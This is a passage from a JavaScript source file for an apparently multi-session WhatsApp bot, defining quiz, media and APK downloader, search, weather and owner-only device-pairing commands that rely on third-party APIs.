          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract quiz data
      let question = data.result?.question || data.question || data.text;
      let options = data.result?.options || data.options || [];
      let answer = data.result?.answer || data.answer || data.correct;
      let category = data.result?.category || data.category || 'Anime';
      let difficulty = data.result?.difficulty || data.difficulty || 'Medium';
      let image = data.result?.image || data.image || null;

      if (!question || options.length === 0) {
        throw new Error("Could not extract quiz from API response.");
      }

      // Store active quiz for answer retrieval
      global.activeAnimeQuiz = {
        from: from,
        question: question,
        options: options,
        answer: answer,
        category: category,
        difficulty: difficulty,
        timestamp: Date.now()
      };

      // Build the quiz message
      let msg = `🎌 *Anime Quiz Time!*\n\n`;
      msg += `📝 *${question}*\n\n`;
      msg += `*Options:*\n`;
      options.forEach((opt, i) => {
        msg += `${String.fromCharCode(65 + i)}. ${opt}\n`;
      });
      msg += `\n📌 *Category:* ${category}\n`;
      msg += `📊 *Difficulty:* ${difficulty}\n\n`;
      msg += `🤔 *Think you know?* Choose your answer!\n\n`;
      msg += `💡 Use ${prefix}${command} answer to reveal the correct answer.`;

      // Send with image if available
      if (image && image.startsWith('http')) {
        try {
          await sock.sendMessage(from, {
            image: { url: image },
            caption: msg
          });
        } catch (imgErr) {
          await sock.sendMessage(from, { text: msg });
        }
      } else {
        await sock.sendMessage(from, { text: msg });
      }

    } catch (error) {
      console.error('Anime quiz error:', error);

      // Fallback: Try alternative anime quiz API
      try {
        const altUrl = 'https://apis.davidcyril.name.ng/games/anime-quiz-v2';
        const altRes = await fetch(altUrl);
        const altData = await altRes.json();

        let altQuestion = altData.result?.question || altData.question;
        let altOptions = altData.result?.options || altData.options || [];
        let altAnswer = altData.result?.answer || altData.answer;

        if (altQuestion && altOptions.length > 0) {
          global.activeAnimeQuiz = {
            from: from,
            question: altQuestion,
            options: altOptions,
            answer: altAnswer,
            category: altData.result?.category || altData.category || 'Anime',
            difficulty: altData.result?.difficulty || altData.difficulty || 'Medium',
            timestamp: Date.now()
          };

          let msg = `🎌 *Anime Quiz Time! (fallback)*\n\n`;
          msg += `📝 *${altQuestion}*\n\n`;
          msg += `*Options:*\n`;
          altOptions.forEach((opt, i) => {
            msg += `${String.fromCharCode(65 + i)}. ${opt}\n`;
          });
          msg += `\n📌 *Category:* ${altData.result?.category || altData.category || 'Anime'}\n`;
          msg += `📊 *Difficulty:* ${altData.result?.difficulty || altData.difficulty || 'Medium'}\n\n`;
          msg += `💡 Use ${prefix}${command} answer to reveal the correct answer.`;

          return await sock.sendMessage(from, { text: msg });
        }
      } catch (altErr) {}

      // Fallback: Local anime quiz
      const localQuizzes = [
        {
          question: "Which anime features a character named Goku?",
          options: ["Naruto", "Dragon Ball", "One Piece", "Bleach"],
          answer: "Dragon Ball",
          category: "Shonen",
          difficulty: "Easy"
        },
        {
          question: "What is the name of Naruto's signature attack?",
          options: ["Kamehameha", "Gomu Gomu", "Rasengan", "Bankai"],
          answer: "Rasengan",
          category: "Shonen",
          difficulty: "Easy"
        },
        {
          question: "Which anime is about pirates searching for treasure?",
          options: ["Naruto", "One Piece", "Attack on Titan", "Death Note"],
          answer: "One Piece",
          category: "Adventure",
          difficulty: "Easy"
        },
        {
          question: "What is the name of the main protagonist in Attack on Titan?",
          options: ["Eren Yeager", "Mikasa Ackerman", "Armin Arlert", "Levi Ackerman"],
          answer: "Eren Yeager",
          category: "Action",
          difficulty: "Medium"
        }
      ];

      const random = localQuizzes[Math.floor(Math.random() * localQuizzes.length)];
      global.activeAnimeQuiz = {
        from: from,
        question: random.question,
        options: random.options,
        answer: random.answer,
        category: random.category,
        difficulty: random.difficulty,
        timestamp: Date.now()
      };

      let msg = `🎌 *Anime Quiz Time! (local)*\n\n`;
      msg += `📝 *${random.question}*\n\n`;
      msg += `*Options:*\n`;
      random.options.forEach((opt, i) => {
        msg += `${String.fromCharCode(65 + i)}. ${opt}\n`;
      });
      msg += `\n📌 *Category:* ${random.category}\n`;
      msg += `📊 *Difficulty:* ${random.difficulty}\n\n`;
      msg += `💡 Use ${prefix}${command} answer to reveal the correct answer.`;

      await sock.sendMessage(from, { text: msg });
    }
  }
});


register({
  name: 'instagram',
  aliases: ['ig', 'igdl', 'insta'],
  category: 'DOWNLOADER',
  description: 'Download Instagram Reels, Videos, and Images',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `📥 *Instagram Downloader*\n\nUsage: ${prefix}${command} <url>\nExample: ${prefix}${command} https://www.instagram.com/p/xxxxx/\n\n*Supports:*\n• Posts (images/videos)\n• Reels\n• IGTV` 
      });
    }

    const url = args[0];

    if (!url.includes('instagram.com') && !url.includes('instagr.am')) {
      return await sock.sendMessage(from, { 
        text: `❌ Invalid URL. Please provide a valid Instagram link.` 
      });
    }

    await sock.sendMessage(from, { text: `⏳ Processing Instagram media...` });

    try {
      // Primary: OmegaTech API
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const response = await fetch(`${baseUrl}/api/download/instagram?url=${encodeURIComponent(url)}`, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();
      
      // Extract media URLs
      let videoUrl = data.result?.video || data.result?.download_url || data.video || data.download_url;
      let imageUrls = data.result?.images || data.images || data.result?.urls || data.urls || [];
      let caption = data.result?.caption || data.caption || data.title || 'Instagram Media';
      let username = data.result?.username || data.username || data.author || 'Unknown';

      // Handle single image case
      if (!videoUrl && !imageUrls.length) {
        const singleImage = data.result?.image || data.result?.url || data.image || data.url;
        if (singleImage) {
          imageUrls = [singleImage];
        }
      }

      // Fallback: try to find any URL in the response
      if (!videoUrl && !imageUrls.length) {
        const jsonString = JSON.stringify(data);
        const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp4|mov|jpg|jpeg|png|gif)/gi);
        if (urlMatch) {
          const videoMatch = urlMatch.find(u => u.includes('.mp4') || u.includes('.mov'));
          if (videoMatch) videoUrl = videoMatch;
          else imageUrls = urlMatch;
        }
      }

      if (!videoUrl && !imageUrls.length) {
        throw new Error("Could not extract media from API response.");
      }

      // Send caption preview
      await sock.sendMessage(from, { 
        text: `📸 *${caption}*\n👤 *Author:* @${username}\n\n⬇️ *Downloading media...*` 
      });

      // Send video if available
      if (videoUrl) {
        const videoResponse = await fetch(videoUrl, {
          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
        });

        if (videoResponse.ok) {
          const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());
          if (videoBuffer.length > 5000) {
            await sock.sendMessage(from, {
              video: videoBuffer,
              mimetype: 'video/mp4',
              caption: `📸 *${caption}*\n👤 *Author:* @${username}\n\n✅ *Instagram Download Success*`
            });
          }
        }
      }

      // Send images (up to 10)
      if (imageUrls.length) {
        const maxImages = Math.min(imageUrls.length, 10);
        for (let i = 0; i < maxImages; i++) {
          try {
            const imgUrl = imageUrls[i];
            if (imgUrl) {
              await sock.sendMessage(from, {
                image: { url: imgUrl },
                caption: i === 0 ? `📸 *${caption}*\n👤 *Author:* @${username}\n📷 ${i+1}/${maxImages}` : `📷 ${i+1}/${maxImages}`
              });
              await new Promise(r => setTimeout(r, 500));
            }
          } catch (imgErr) {
            // Continue to next image
          }
        }
      }

    } catch (error) {
      console.error('Instagram download error:', error);
      
      // Fallback: Prince API
      try {
        const princeUrl = 'https://api.princetechn.com/api/download/ig';
        const fallbackRes = await fetch(`${princeUrl}?apikey=prince&url=${encodeURIComponent(url)}`);
        const fallbackData = await fallbackRes.json();
        
        let fallbackVideo = fallbackData.result?.video || fallbackData.video;
        let fallbackImages = fallbackData.result?.images || fallbackData.images || [];
        
        if (fallbackVideo || fallbackImages.length) {
          if (fallbackVideo) {
            const vRes = await fetch(fallbackVideo);
            const vBuf = Buffer.from(await vRes.arrayBuffer());
            if (vBuf.length > 5000) {
              await sock.sendMessage(from, { video: vBuf, mimetype: 'video/mp4', caption: '✅ Instagram Download (fallback)' });
            }
          }
          if (fallbackImages.length) {
            for (const img of fallbackImages.slice(0, 5)) {
              await sock.sendMessage(from, { image: { url: img } });
              await new Promise(r => setTimeout(r, 500));
            }
          }
          return;
        }
      } catch (fallbackErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ Download Error: ${error.message || 'Unknown error'}\n\n💡 Try again or use a different link.` 
      });
    }
  }
});
// ==========================================
//          PAIRING COMMAND
// ==========================================

// Store active pairing sessions

register({
  name: 'pair',
  aliases: ['paircode', 'pairing', 'getpair'],
  category: 'MAIN',
  description: 'Generate a real WhatsApp pairing code for another number (owner only)',
  async execute({ sock, from, args, msg, prefix, command }) {
    // Owner only command
    const ownerJid = getOwnerJid(sock);
    const isOwner = from === ownerJid || msg.key.fromMe;

    if (!isOwner) {
      return await sock.sendMessage(from, {
        text: `❌ *Owner only command.*\n\nOnly the bot owner can generate pairing codes.`
      });
    }

    const phone = (args[0] || '').replace(/[^0-9]/g, '');
    if (!phone || phone.length < 7) {
      return await sock.sendMessage(from, {
        text: `❌ Please provide the number to pair, digits only with country code.\nUsage: ${prefix}${command} 15551234567\n\n_Tip: anyone can also self-serve this from the bot's web page instead of asking you._`
      });
    }

    try {
      // Delegates to the real session manager, which requests an actual
      // pairing code from WhatsApp for that number — the same flow the web
      // pairing page uses. A locally-invented code can never work here since
      // WhatsApp only accepts codes it issued itself.
      const { startSession } = require('../sessionManager');
      const result = await startSession(phone);

      if (result.alreadyLinked) {
        return await sock.sendMessage(from, { text: `✅ ${phone} is already linked and connected.` });
      }

      await sock.sendMessage(from, {
        text: `🔗 *WhatsApp Pairing Code*\n\n📌 *Code:* \`${result.pairingCode}\`\n\n📱 On the *${phone}* device: WhatsApp → Settings → Linked Devices → Link a Device → enter this code.\n\n⏱️ It expires quickly, so use it right away.`
      });
    } catch (error) {
      console.error('Pairing error:', error);
      await sock.sendMessage(from, {
        text: `⚠️ Error generating pairing code: ${error.message || 'Unknown error'}`
      });
    }
  }
});

// Command to check active/linked sessions
register({
  name: 'pairsessions',
  aliases: ['pairlist', 'sessions'],
  category: 'MAIN',
  description: 'List active bot sessions (owner only)',
  async execute({ sock, from, msg }) {
    const ownerJid = getOwnerJid(sock);
    const isOwner = from === ownerJid || msg.key.fromMe;

    if (!isOwner) {
      return await sock.sendMessage(from, { text: '❌ Owner only command.' });
    }

    const { listSessions } = require('../sessionManager');
    const all = listSessions();

    if (all.length === 0) {
      return await sock.sendMessage(from, { text: 'No sessions yet.' });
    }

    const lines = all.map((s) => `📌 ${s.phone} — ${s.status}`).join('\n');
    await sock.sendMessage(from, { text: `🔗 *Bot Sessions*\n\n${lines}` });
  }
});

// Command to log out / unlink a paired session
register({
  name: 'revokepair',
  aliases: ['revokecode', 'cancelpair', 'unlink'],
  category: 'MAIN',
  description: 'Log out a linked session by phone number (owner only)',
  async execute({ sock, from, args, msg, prefix, command }) {
    const ownerJid = getOwnerJid(sock);
    const isOwner = from === ownerJid || msg.key.fromMe;

    if (!isOwner) {
      return await sock.sendMessage(from, { text: '❌ Owner only command.' });
    }

    const phone = (args[0] || '').replace(/[^0-9]/g, '');
    if (!phone) {
      return await sock.sendMessage(from, {
        text: `❌ Please provide the phone number to unlink.\nUsage: ${prefix}${command} <phone>`
      });
    }

    const { getSession } = require('../sessionManager');
    const target = getSession(phone);
    if (!target) {
      return await sock.sendMessage(from, { text: `❌ No session found for \`${phone}\`.` });
    }

    try {
      await target.sock.logout();
      await sock.sendMessage(from, { text: `✅ \`${phone}\` has been logged out.` });
    } catch (error) {
      await sock.sendMessage(from, { text: `⚠️ Could not log out \`${phone}\`: ${error.message}` });
    }
  }
});


register({
  name: 'apk',
  aliases: ['apkdl', 'downloadapk', 'androidapp'],
  category: 'DOWNLOADER',
  description: 'Search and download APK files for Android apps',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `📱 *APK Downloader*\n\nUsage: ${prefix}${command} <app name>\nExample: ${prefix}${command} WhatsApp\n\n*Examples:*\n${prefix}${command} Instagram\n${prefix}${command} Spotify\n${prefix}${command} YouTube\n\n*Note:* Downloads the latest version of the app from a trusted source.` 
      });
    }

    const query = args.join(" ");

    await sock.sendMessage(from, { text: `⏳ Searching for "${query}"...` });

    try {
      // Use Prince API for APK download
      const princeUrl = 'https://api.princetechn.com/api/download/apkdl';
      const response = await fetch(`${princeUrl}?apikey=prince&appName=${encodeURIComponent(query)}`, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract APK data
      let appName = data.result?.appname || data.appname || data.title || query;
      let developer = data.result?.developer || data.developer || data.author || 'Unknown';
      let version = data.result?.version || data.version || 'Latest';
      let size = data.result?.size || data.size || 'N/A';
      let downloadUrl = data.result?.download_url || data.result?.url || data.download_url || data.url;
      let thumbnail = data.result?.thumbnail || data.thumbnail || data.image || data.icon || null;
      let description = data.result?.description || data.description || '';

      if (!downloadUrl) {
        const jsonString = JSON.stringify(data);
        const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(apk|zip)/i);
        if (urlMatch) downloadUrl = urlMatch[0];
      }

      if (!downloadUrl) {
        throw new Error("Could not extract download URL from API response.");
      }

      // Send app info with thumbnail
      let infoMsg = `📱 *${appName}*\n\n`;
      infoMsg += `👤 *Developer:* ${developer}\n`;
      infoMsg += `📌 *Version:* ${version}\n`;
      infoMsg += `📦 *Size:* ${size}\n`;
      if (description) infoMsg += `📝 *Description:* ${description.slice(0, 150)}${description.length > 150 ? '...' : ''}\n\n`;
      infoMsg += `⬇️ *Downloading APK...*`;

      if (thumbnail) {
        try {
          await sock.sendMessage(from, {
            image: { url: thumbnail },
            caption: infoMsg
          });
        } catch (thumbErr) {
          await sock.sendMessage(from, { text: infoMsg });
        }
      } else {
        await sock.sendMessage(from, { text: infoMsg });
      }

      // Download the APK file
      const apkResponse = await fetch(downloadUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': '*/*'
        }
      });

      if (!apkResponse.ok) {
        throw new Error(`APK download failed: ${apkResponse.status}`);
      }

      const apkBuffer = Buffer.from(await apkResponse.arrayBuffer());

      if (apkBuffer.length < 10000) {
        throw new Error("Downloaded file is too small. The link may be invalid.");
      }

      const fileSizeMB = (apkBuffer.length / 1024 / 1024).toFixed(1);
      const fileName = `${appName.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.apk`;

      // Send the APK file
      try {
        await sock.sendMessage(from, {
          document: apkBuffer,
          mimetype: 'application/vnd.android.package-archive',
          fileName: fileName,
          caption: `📱 *${appName}*\n📌 *Version:* ${version}\n📦 *Size:* ${fileSizeMB} MB\n\n✅ *APK Download Success*\n\n⚠️ *Scan before installing!*`
        });
      } catch (sendErr) {
        // Try sending as document with a different mimetype
        try {
          await sock.sendMessage(from, {
            document: apkBuffer,
            mimetype: 'application/octet-stream',
            fileName: fileName,
            caption: `📱 *${appName}*\n📦 *Size:* ${fileSizeMB} MB\n\n✅ *APK Download Success*`
          });
        } catch (sendErr2) {
          throw new Error("Failed to send the APK file. It may be too large.");
        }
      }

    } catch (error) {
      console.error('APK download error:', error);

      // Fallback: Try alternative Prince endpoint
      try {
        const altUrl = 'https://api.princetechn.com/api/download/apk';
        const altRes = await fetch(`${altUrl}?apikey=prince&appName=${encodeURIComponent(query)}`);
        const altData = await altRes.json();

        let altDownloadUrl = altData.result?.download_url || altData.result?.url || altData.download_url || altData.url;
        let altAppName = altData.result?.appname || altData.appname || query;

        if (altDownloadUrl) {
          const altApkRes = await fetch(altDownloadUrl);
          const altApkBuf = Buffer.from(await altApkRes.arrayBuffer());
          if (altApkBuf.length > 10000) {
            return await sock.sendMessage(from, {
              document: altApkBuf,
              mimetype: 'application/vnd.android.package-archive',
              fileName: `${altAppName.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.apk`,
              caption: `📱 *${altAppName}*\n\n✅ *APK Download Success (fallback)*`
            });
          }
        }
      } catch (altErr) {}

      // Fallback: Try a different API format
      try {
        const fallbackUrl = 'https://api.princetechn.com/api/download/apkdl';
        const fallbackRes = await fetch(`${fallbackUrl}?apikey=prince&app=${encodeURIComponent(query)}`);
        const fallbackData = await fallbackRes.json();

        let fallbackUrl2 = fallbackData.result?.download_url || fallbackData.result?.url || fallbackData.download_url || fallbackData.url;
        let fallbackName = fallbackData.result?.appname || fallbackData.appname || query;

        if (fallbackUrl2) {
          const fRes = await fetch(fallbackUrl2);
          const fBuf = Buffer.from(await fRes.arrayBuffer());
          if (fBuf.length > 10000) {
            return await sock.sendMessage(from, {
              document: fBuf,
              mimetype: 'application/vnd.android.package-archive',
              fileName: `${fallbackName.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.apk`,
              caption: `📱 *${fallbackName}*\n\n✅ *APK Download Success (fallback)*`
            });
          }
        }
      } catch (fallbackErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ APK Error: ${error.message || 'Could not download APK.'}\n\n💡 Try a different app name or try again later.` 
      });
    }
  }
});





    




register({
  name: 'mediafire',
  category: 'DOWNLOADER',
  description: 'Download Mediafire files',
  async execute({ sock, from, args }) {
    if (!args[0]) return sock.sendMessage(from, { text: '❌ Provide a Mediafire link.' });
    await princeDownload(sock, from, args[0], 'mediafire', 'video');
  }
});

// ==========================================
//               SEARCH COMMANDS
// ==========================================

register({
  name: 'google',
  category: 'INFO',
  description: 'Search Google for info',
  async execute({ sock, from, text }) {
    if (!text) return sock.sendMessage(from, { text: '❓ Search query?' });
    try {
      const res = await fetch(`${P_BASE}/search/google?apikey=${P_KEY}&query=${encodeURIComponent(text)}`);
      const data = await res.json();
      if (!data.result || !data.result.length) return sock.sendMessage(from, { text: '❌ No results found.' });
      let msg = `🔎 *Google Search:* ${text}\n\n`;
      data.result.slice(0, 5).forEach(v => msg += `*${v.title}*\n🔗 ${v.link}\n\n`);
      await sock.sendMessage(from, { text: msg });
    } catch (e) {
      await sock.sendMessage(from, { text: '⚠️ Search Error: ' + e.message });
    }
  }
});

register({
  name: 'pinsearch',
  aliases: ['pinseek'],
  category: 'INFO',
  description: 'Find images on Pinterest by keyword',
  async execute({ sock, from, text }) {
    if (!text) return sock.sendMessage(from, { text: '❓ Search query?' });
    try {
      const res = await fetch(`${P_BASE}/search/pinterest?apikey=${P_KEY}&query=${encodeURIComponent(text)}`);
      const data = await res.json();
      const img = data.result && data.result[0];
      if (!img) return sock.sendMessage(from, { text: '❌ No results found.' });
      await sock.sendMessage(from, { image: { url: img }, caption: `📌 Result for: ${text}` });
    } catch (e) {
      await sock.sendMessage(from, { text: '⚠️ Search Error: ' + e.message });
    }
  }
});

register({
  name: 'lyrics',
  category: 'INFO',
  description: 'Find song lyrics',
  async execute({ sock, from, text }) {
    if (!text) return sock.sendMessage(from, { text: '❓ Song name?' });
    try {
      const res = await fetch(`${P_BASE}/search/lyrics?apikey=${P_KEY}&query=${encodeURIComponent(text)}`);
      const data = await res.json();
      if (!data.result) return sock.sendMessage(from, { text: '❌ Lyrics not found.' });
      await sock.sendMessage(from, { text: `🎶 *Lyrics:* ${text}\n\n${data.result}` });
    } catch (e) {
      await sock.sendMessage(from, { text: '⚠️ Lyrics Error: ' + e.message });
    }
  }
});

register({
  name: 'wikipedia',
  category: 'INFO',
  description: 'Search Wikipedia',
  async execute({ sock, from, text }) {
    if (!text) return sock.sendMessage(from, { text: '❓ Search query?' });
    try {
      const res = await fetch(`${P_BASE}/search/wiki?apikey=${P_KEY}&query=${encodeURIComponent(text)}`);
      const data = await res.json();
      if (!data.result) return sock.sendMessage(from, { text: '❌ No article found.' });
      await sock.sendMessage(from, { text: `📖 *Wikipedia:* ${text}\n\n${data.result}` });
    } catch (e) {
      await sock.sendMessage(from, { text: '⚠️ Wikipedia Error: ' + e.message });
    }
  }
});

register({
  name: 'weather',
  aliases: ['wthr', 'forecast', 'temp'],
  category: 'INFO',
  description: 'Get current weather for any city',
  async execute({ sock, from, text, prefix, command }) {
    if (!text) {
      return await sock.sendMessage(from, { 
        text: `🌤️ *Weather Forecast*\n\nUsage: ${prefix}${command} <city name>\nExample: ${prefix}${command} London\n\n*Examples:*\n${prefix}${command} New York\n${prefix}${command} Tokyo\n${prefix}${command} Lagos` 
      });
    }

    await sock.sendMessage(from, { text: `⏳ Fetching weather for *${text}*...` });

    try {
      // Primary: OmegaTech API
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const response = await fetch(`${baseUrl}/api/weather?city=${encodeURIComponent(text)}`, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract weather data from various formats
      let weather = data.result || data.data || data;

      let city = weather.city || weather.name || weather.location || text;
      let country = weather.country || weather.region || '';
      let condition = weather.condition || weather.description || weather.weather || 'N/A';
      let temp = weather.temp || weather.temperature || weather.temp_c || 'N/A';
      let feelsLike = weather.feels_like || weather.feelslike || weather.feels || 'N/A';
      let humidity = weather.humidity || 'N/A';
      let wind = weather.wind || weather.wind_speed || weather.windspeed || 'N/A';
      let pressure = weather.pressure || 'N/A';
      let uv = weather.uv || weather.uv_index || 'N/A';
      let icon = weather.icon || weather.condition_icon || null;

      if (!city && !condition) {
        throw new Error("Could not extract weather data from API response.");
      }

      // Build the weather message
      let msg = `🌤️ *Weather in ${city}${country ? ', ' + country : ''}*\n\n`;
      msg += `☁️ *Condition:* ${condition}\n`;
      msg += `🌡️ *Temperature:* ${temp}°C\n`;
      msg += `🤔 *Feels like:* ${feelsLike}°C\n`;
      msg += `💧 *Humidity:* ${humidity}%\n`;
      msg += `💨 *Wind:* ${wind} km/h\n`;
      msg += `📊 *Pressure:* ${pressure} hPa\n`;
      msg += `☀️ *UV Index:* ${uv}\n\n`;
      msg += `🕐 *Last updated:* ${new Date().toLocaleString()}`;

      // Send with icon if available
      if (icon && icon.startsWith('http')) {
        try {
          await sock.sendMessage(from, {
            image: { url: icon },
            caption: msg
          });
        } catch (iconErr) {
          await sock.sendMessage(from, { text: msg });
        }
      } else {
        await sock.sendMessage(from, { text: msg });
      }

    } catch (error) {
      console.error('Weather error:', error);
      
      // Fallback: Prince API
      try {
        const princeUrl = 'https://api.princetechn.com/api/search/weather';
        const fallbackRes = await fetch(`${princeUrl}?apikey=prince&query=${encodeURIComponent(text)}`);
        const fallbackData = await fallbackRes.json();
        
        const w = fallbackData.result || fallbackData.data;
        if (w) {
          let msg = `🌤️ *Weather in ${w.city || w.name || text}*\n\n`;
          msg += `☁️ *Condition:* ${w.condition || w.weather || 'N/A'}\n`;
          msg += `🌡️ *Temperature:* ${w.temp || w.temperature || 'N/A'}°C\n`;
          msg += `💧 *Humidity:* ${w.humidity || 'N/A'}%\n`;
          msg += `💨 *Wind:* ${w.wind || w.windspeed || 'N/A'} km/h\n\n`;
          msg += `🕐 *Last updated:* ${new Date().toLocaleString()}`;
          return await sock.sendMessage(from, { text: msg });
        }
      } catch (fallbackErr) {
        // Silent fail
      }

      // Fallback: Free OpenWeatherMap-like API (wttr.in)
      try {
        const wttrRes = await fetch(`https://wttr.in/${encodeURIComponent(text)}?format=%l:+%c+%t+%h+%w+%p`, {
          headers: { 'User-Agent': 'curl' }
        });
        const wttrData = await wttrRes.text();
        if (wttrData && !wttrData.includes('Unknown location')) {
          return await sock.sendMessage(from, { 
            text: `🌤️ *Weather Report*\n\n${wttrData}\n\n🕐 ${new Date().toLocaleString()}` 
          });
        }
      } catch (wttrErr) {}

      await sock.sendMessage(from, { 
        text: `⚠️ Weather Error: Could not find weather for "${text}".\n\n💡 Try another city name or check your spelling.` 
      });
    }
  }
});

register({
  name: 'facebook',
  aliases: ['fb', 'fbdl', 'facebookdl'],
  category: 'DOWNLOADER',
  description: 'Download Facebook Videos (HD/SD)',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `📥 *Facebook Downloader*\n\nUsage: ${prefix}${command} <url>\nExample: ${prefix}${command} https://www.facebook.com/reel/402579285704851` 
      });
    }

    const url = args[0];

    if (!url.includes('facebook.com') && !url.includes('fb.watch')) {
      return await sock.sendMessage(from, { 
        text: `❌ Invalid URL. Please provide a valid Facebook link.` 
      });
    }

    await sock.sendMessage(from, { text: `⏳ Processing Facebook video...` });

    try {
      // Primary: GiftedTech API
      const response = await fetch(
        `https://api.giftedtech.co.ke/api/download/facebook?apikey=gifted&url=${encodeURIComponent(url)}`,
        {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      let title = data.result?.title || 'Facebook Video';
      let duration = data.result?.duration || 'N/A';
      let thumbnail = data.result?.thumbnail || null;
      let hdVideo = data.result?.hd_video || null;
      let sdVideo = data.result?.sd_video || null;

      if (!hdVideo && !sdVideo) {
        throw new Error("Could not extract video URL from API response.");
      }

      let videoUrl = hdVideo || sdVideo;
      let quality = hdVideo ? 'HD' : 'SD';

      if (!videoUrl || !videoUrl.startsWith('http')) {
        throw new Error("Invalid video URL received.");
      }

      // Send thumbnail if available
      if (thumbnail) {
        try {
          await sock.sendMessage(from, {
            image: { url: thumbnail },
            caption: `🎬 *${title}*\n⏱️ *Duration:* ${duration}\n📊 *Quality:* ${quality}\n\n⬇️ *Downloading and converting video...*`
          });
        } catch (thumbErr) {}
      }

      // Download video
      let videoBuffer = null;

      // Try HD first
      if (hdVideo) {
        try {
          const videoResponse = await fetch(hdVideo, {
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            timeout: 30000
          });
          if (videoResponse.ok) {
            videoBuffer = Buffer.from(await videoResponse.arrayBuffer());
            quality = 'HD';
          }
        } catch (err) {
          console.warn('HD download failed:', err.message);
        }
      }

      // If HD failed, try SD
      if (!videoBuffer || videoBuffer.length < 5000) {
        if (sdVideo) {
          try {
            const sdResponse = await fetch(sdVideo, {
              headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
              timeout: 30000
            });
            if (sdResponse.ok) {
              videoBuffer = Buffer.from(await sdResponse.arrayBuffer());
              quality = 'SD';
            }
          } catch (err) {
            console.warn('SD download failed:', err.message);
          }
        }
      }

      if (!videoBuffer || videoBuffer.length < 5000) {
        throw new Error("Video download failed. The link may be expired or corrupted.");
      }

      const originalSize = (videoBuffer.length / 1024 / 1024).toFixed(1);

      // --- USE CONVERTER TO REPAIR THE VIDEO ---
      let finalBuffer = videoBuffer;
      let converted = false;

      try {
        // Import the toVideo or converter function from your lib
        const { toVideo, toMP4 } = require('../lib/converter');
        
        // Try to convert/re-encode the video
        if (typeof toVideo === 'function') {
          const convertedBuffer = await toVideo(videoBuffer);
          if (convertedBuffer && convertedBuffer.length > 5000) {
            finalBuffer = convertedBuffer;
            converted = true;
            console.log('Video converted successfully');
          }
        } else if (typeof toMP4 === 'function') {
          const convertedBuffer = await toMP4(videoBuffer);
          if (convertedBuffer && convertedBuffer.length > 5000) {
            finalBuffer = convertedBuffer;
            converted = true;
            console.log('Video converted successfully');
          }
        } else {
          // Try toAudio as fallback (if it can handle video)
          const { toAudio } = require('../lib/converter');
          // toAudio might only handle audio, but worth a try if no other function exists
        }
      } catch (convErr) {
        console.warn('Video conversion skipped:', convErr.message);
        // Fallback: Use ffmpeg directly if available
        try {
          const ffmpeg = require('ffmpeg-static');
          const { exec } = require('child_process');
          const fs = require('fs');
          const path = require('path');
          
          const tmpDir = path.join(process.cwd(), 'tmp');
          if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
          
          const inputPath = path.join(tmpDir, `fb_${Date.now()}.mp4`);
          const outputPath = path.join(tmpDir, `fb_converted_${Date.now()}.mp4`);
          
          fs.writeFileSync(inputPath, videoBuffer);
          
          await new Promise((resolve, reject) => {
            exec(`"${ffmpeg}" -i "${inputPath}" -c:v libx264 -c:a aac -movflags +faststart "${outputPath}"`, (error) => {
              if (error) reject(error);
              else resolve();
            });
          });
          
          if (fs.existsSync(outputPath)) {
            finalBuffer = fs.readFileSync(outputPath);
            converted = true;
            try { fs.unlinkSync(inputPath); } catch {}
            try { fs.unlinkSync(outputPath); } catch {}
          }
        } catch (ffmpegErr) {
          console.warn('FFmpeg conversion failed:', ffmpegErr.message);
        }
      }

      const finalSize = (finalBuffer.length / 1024 / 1024).toFixed(1);

      // Check file size
      if (finalBuffer.length > 16 * 1024 * 1024) {
        await sock.sendMessage(from, {
          document: finalBuffer,
          mimetype: 'video/mp4',
          fileName: `facebook_${Date.now()}.mp4`,
          caption: `🎬 *${title}*\n⏱️ *Duration:* ${duration}\n📊 *Quality:* ${quality}\n📦 *Size:* ${finalSize} MB\n${converted ? '🔄 *Re-encoded for compatibility*\n' : ''}\n⚠️ *Sent as document due to size limit.*`
        });
        return;
      }

      // Send the video
      try {
        await sock.sendMessage(from, {
          video: finalBuffer,
          mimetype: 'video/mp4',
